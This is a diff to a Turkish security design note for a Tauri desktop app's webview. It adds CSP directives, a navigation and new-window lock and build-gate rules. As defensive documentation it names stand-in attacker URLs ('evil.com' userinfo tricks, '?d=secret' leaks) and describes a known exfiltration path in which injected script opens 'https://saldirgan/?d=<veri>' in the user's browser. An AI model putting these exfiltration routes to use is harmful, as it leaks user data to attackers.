@@ -6,7 +6,7 @@ Bu not D3 sonundaki Tauri kabuğunu anlatır: webview'ın ne yapabildiği, istek
 
 | Katman | Yer | Görev |
 |---|---|---|
-| Webview | `desktop/src` | Arayüz. D3'te yalnız smoke sayfası; React uygulaması D4'te gelir. Ağa çıkamaz, yalnız komut çağırır. |
+| Webview | `desktop/src` | Arayüz. D3'te yalnız smoke sayfası; React uygulaması D4'te gelir. Veriyi komutlarla alır: istekler CSP ile, gezinme ve yeni pencere navigasyon kilidiyle kapalı; tek istisna `shell:allow-open` (bkz. [Capability](#capability)). |
 | Köprü | `desktop/src/bridge` | Tipli `invoke`/`listen` sarmalayıcıları. `generated/` Rust DTO'larından üretilir. |
 | Kabuk | `desktop/src-tauri` | Komutlar, yönlendirme, profiller, realtime köprüsü, loglama. |
 | `keystone-sync` | `desktop/crates/keystone-sync` | HTTP istemcisi, SQLCipher yerel kopya, outbox, conflict, sync döngüsü. |
@@ -103,22 +103,32 @@ Servis adı `com.keystone.desktop`. Sırlar yalnız OS keychain'inde durur.
 ```
 default-src 'self'; connect-src ipc: http://ipc.localhost; img-src 'self' data: blob:;
 font-src 'self' data:; style-src 'self'; script-src 'self'; object-src 'none';
-frame-ancestors 'none'; form-action 'none'
+frame-ancestors 'none'; form-action 'none'; base-uri 'self'
 ```
 
 - `connect-src` yalnız IPC'dir: `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource` ve `sendBeacon` dış adrese, hatta uygulamanın kendi kökenine çıkamaz. İki adres de gerekir, çünkü IPC Windows'ta `http://ipc.localhost`, diğer sistemlerde `ipc:` üzerinden gider. Biri eksik olursa IPC kırılmaz ama sessizce yavaş `postMessage` yoluna düşer.
 - Tauri paketli varlıklardaki `script-src` ve `style-src` yönergelerine hash ve nonce ekler (`dangerousDisableAssetCspModification` kapalı kalır). Bu nedenle webview'ın gördüğü başlık yapılandırma metniyle aynı değildir. Windows'ta `tauri build --debug` ikilisinde ölçülen başlık (`http://tauri.localhost/`):
 
   ```
-  connect-src ipc: http://ipc.localhost; script-src 'self' 'sha256-…'; font-src 'self' data:;
-  form-action 'none'; img-src 'self' data: blob:; frame-ancestors 'none'; style-src 'self';
-  object-src 'none'; default-src 'self'
+  base-uri 'self'; script-src 'self' 'sha256-…'; img-src 'self' data: blob:; form-action 'none';
+  font-src 'self' data:; object-src 'none'; default-src 'self'; connect-src ipc: http://ipc.localhost;
+  frame-ancestors 'none'; style-src 'self'
   ```
 
-  Aynı pencerede dış `fetch`/XHR/WebSocket/EventSource/beacon `connect-src`, dış görsel `img-src`, satır içi betik ve `eval` `script-src`, satır içi stil özniteliği `style-src-attr` ihlaliyle engellendi; `app_info` ve olay dinleme çalıştı.
-- `style-src-attr 'unsafe-inline'` yoktur: bugünkü sayfada satır içi stil ölçülmedi. Radix ve sonner gelince D4 ölçerek ekler.
+  Aynı pencerede dış `fetch`/XHR/WebSocket/EventSource/beacon `connect-src`, dış görsel `img-src`, satır içi betik ve `eval` `script-src`, satır içi stil özniteliği `style-src-attr`, enjekte edilen `<base href="https://…">` `base-uri` ihlaliyle engellendi; `app_info` ve olay dinleme çalıştı.
+- `base-uri 'self'`: `default-src` bu yönergeyi kapsamaz; olmadan enjekte edilmiş bir `<base>` göreli adresleri başka köke saptırırdı.
+- `style-src-attr 'unsafe-inline'` yoktur: bugünkü sayfada satır içi stil ölçülmedi. Radix ve sonner gelince D4 ölçerek ekler; `style-src 'unsafe-inline'` olarak genişletilmez.
 - `keystone-asset:` D5'te eklenir.
-- `devCsp` yalnız `tauri dev` içindir, tek farkı Vite'ın `ws://localhost:1420` soketidir.
+- `devCsp` yapılandırmada Vite'ın `ws://localhost:1420` soketi dışında aynıdır, ama **`tauri dev` penceresinde uygulanmıyor** (ölçüldü): sayfa Vite'tan (`http://localhost:1420`) gelir, Tauri CSP'yi yalnız kendi protokol yanıtına ekler. Dev penceresinde CSP başlığı yoktu, enjekte `<base>` ve dış istekte ihlal raporlanmadı. CSP ihlalleri bugün yalnız `tauri build --debug` ikilisinde görülür. Düzeltme `vite.desktop.config.ts` içinde `server.headers['Content-Security-Policy']` (P0 dosyası, D4).
+
+### Gezinme ve yeni pencere
+
+CSP üst düzey gezinmeyi ve `window.open`'ı kapsamaz. Ana pencere bu yüzden yapılandırmadan değil kodda kurulur (`tauri.conf.json` içinde `create: false`, `lib.rs` `create_main_window`):
+
+- `on_navigation`: yalnız uygulama kökeni (`http://tauri.localhost`, `tauri://localhost`) ve yalnız `tauri dev` derlemesinde `build.devUrl` kökeni kabul edilir. Kullanıcı bilgisi taşıyan adresler (`http://tauri.localhost@evil.com`, `http://user@tauri.localhost`), benzer ana makineler, başka port, `https://tauri.localhost`, `data:`, `file:`, `about:`, `blob:` reddedilir. Karar `app_url_allowed` saf fonksiyonunda, tablo testli. Engellenen gezinme yalnız şemasıyla loglanır.
+- `on_new_window`: her istek reddedilir. `window.open` `null` döner, `target=_blank` hiçbir şey açmaz. İzin verilen bir açılır pencere Tauri'nin yönetmediği, capability dışı bir WebView2 penceresi olurdu.
+- Pencerede ölçüldü: `window.open('https://example.com/?d=…')` `null` döndü ve yeni hedef açılmadı; `location` ile `https://`, kullanıcı bilgili, benzer ana makineli, `data:`, `file:` adreslerine gidilemedi; aynı köken içi gezinme çalıştı. Kilit geçici kaldırılınca aynı denemede pencere açıldı ve sayfa `https://example.com/?d=secret` adresine gitti.
+- Gezinme kilidi bir plugin'in `on_navigation` kancası yerine pencere kurucusunda durur: plugin kancası webview kaydı tamamlanmadan gelen gezinmede çağrılmaz, pencere kancası her gezinmede çağrılır. Yeni pencere kancası zaten yalnız pencere kurucusunda vardır.
 
 ### Derleme kapısı
 
@@ -126,8 +136,13 @@ frame-ancestors 'none'; form-action 'none'
 
 - politika yok ya da yer tutucu (`keystone-placeholder-csp`);
 - `connect-src` tam olarak `ipc:` ve `http://ipc.localhost` değil (`http:`, `https:`, `ws:`, `wss:`, adres, `*`, `'self'` reddedilir, yönerge yoksa da reddedilir);
+- başka herhangi bir yönergede şema ya da ana makine adlandıran kaynak (`img-src https:`, `media-src *`, `frame-src https://…`, `font-src http:` vb.); bu yönergelerde yalnız `'self'`, `'none'`, hash, nonce, `data:`, `blob:` ve anahtar sözcükler kalır;
+- betik yönergelerinde (`default-src`, `script-src`, `script-src-elem`, `script-src-attr`, `worker-src`) `'unsafe-inline'`, `'unsafe-eval'`, `'unsafe-hashes'`, `'wasm-unsafe-eval'` gibi anahtar sözcükler, `data:` ya da `blob:`;
+- `report-uri` ya da `report-to` (ihlal raporu cihaz dışına gider);
 - `dangerousDisableAssetCspModification` açık;
 - `KEYSTONE_DEV_ALLOW_HTTP` ayarlı.
+
+CI `desktop-shell` işi `cargo check --release -p keystone-desktop` ile kapıyı gerçek yapılandırmada koşar ve `connect-src https:` ekleyen bir `TAURI_CONFIG` ile derlemenin reddedildiğini doğrular.
 
 Debug derlemesi aynı sorunlarda yalnız uyarır; `tauri build --debug` çıktısı dağıtılmaz. `KEYSTONE_DEV_ALLOW_HTTP=1` yalnız debug derlemede etkilidir (`bootstrap::allow_http`), release ikilisi değişkeni okusa da yok sayar.
 
@@ -142,11 +157,13 @@ Debug derlemesi aynı sorunlarda yalnız uyarır; `tauri build --debug` çıktı
 | `core:window:allow-show`, `allow-hide`, `allow-set-focus`, `allow-minimize`, `allow-close` | Pencere yönetimi; plan D4 için ayırdı, bugün kullanılmıyor |
 | `os:allow-platform` | Etkisiz: tauri-plugin-os 2'de `platform` komut değildir, değer başlangıç betiğiyle gelir (pencerede `Command platform not found`) |
 | `process:allow-restart` | Yeniden başlatma; plan D5 için ayırdı, bugün kullanılmıyor |
-| `shell:allow-open` | Dış `https` bağlantısını varsayılan tarayıcıda açma |
+| `shell:allow-open` | Dış `https` bağlantısını varsayılan tarayıcıda açma; bugün TS tarafında kullanılmıyor. Ağ etkili tek izin, bkz. aşağıdaki not |
 
 `fs`, `http`, `dialog`, `core:path`, `core:app`, `core:webview` izinleri yoktur; pencerede bu komutlar `not allowed` ile reddedildi. Uygulama komutları capability ile kapılı değildir; kendi doğrulamalarını yapar.
 
 `shell:allow-open` için URL sınırı capability'de değil, `plugins.shell.open` deseninde durur: plugin `open` komutunda yalnız bu deseni uygular, capability kapsamına URL yazmak etkisizdir. Plugin deseni `^{desen}$` olarak derler; desen `https://\S+` olduğundan boşluk ya da satır sonu içermeyen `https://` adresleri kabul edilir, `http`, `file`, `mailto`, `tel` ve yol reddedilir. D3 öncesindeki `^https://` deseni `^^https://$` olarak derlendiği için hiçbir gerçek adresi kabul etmiyordu. Desen kaldırılırsa plugin varsayılanı `http`, `mailto`, `tel` açar; `shell_open_is_limited_by_the_config_pattern` testi deseni plugin gibi derleyip sabitler.
+
+**Bilinen sınır:** `shell:allow-open` webview'a ağa etkili tek kapıyı bırakır. Sayfada betik çalıştırabilen bir saldırgan (XSS, ele geçirilmiş bağımlılık) `https://saldirgan/?d=<veri>` adresini kullanıcının tarayıcısında açarak veri sızdırabilir. İzin plan gereği şimdilik duruyor (şef kararı). D4'te webview'dan açılacak bağlantıları doğrulayan bir Rust komutuyla değiştirilir ve izin kaldırılır.
 
 ### Tek örnek
 
@@ -189,6 +206,8 @@ Log formatı `src-tauri/src/logging.rs` içinde maskelenir: token, parola, kanal
 | `mask` kaçışlı JSON ve `Value` Debug biçimlerini yakalamaz | Bugün bu biçimde log yazan kod yok | `SECRET_FIELD` genişletilir |
 | `a_sign_in_during_the_call_sends_it_once_more` | 150 ms bekleme nedeniyle yük altında kırılgan | Sabit bekleme yerine olay |
 | `allow-emit`, `core:window:*`, `os:allow-platform`, `process:allow-restart` | Bugünkü sayfa kullanmıyor, plan D4/D5 için ayırdı | D4 sonunda kullanılmayan çıkarılır |
+| `shell:allow-open` XSS sonrası sızıntı kanalı | Saldırgan `https://` adres açabilir | D4: doğrulayan Rust komutu, izin kaldırılır |
+| `tauri dev`'de CSP uygulanmıyor | Geliştirici ihlalleri yalnız debug ikilisinde görür | `vite.desktop.config.ts` `server.headers` |
 | `shell` plugin'inin `open` komutu kullanımdan kalkıyor | Davranış bugün doğru | `tauri-plugin-opener` (`opener:allow-open-url` URL kapsamını uygular) |
 | Webview'da token yokluğu yalnız giriş öncesi ölçüldü | Giriş sonrası depolama ve bellek araması elle yapılacak | Kapanış turu |
 
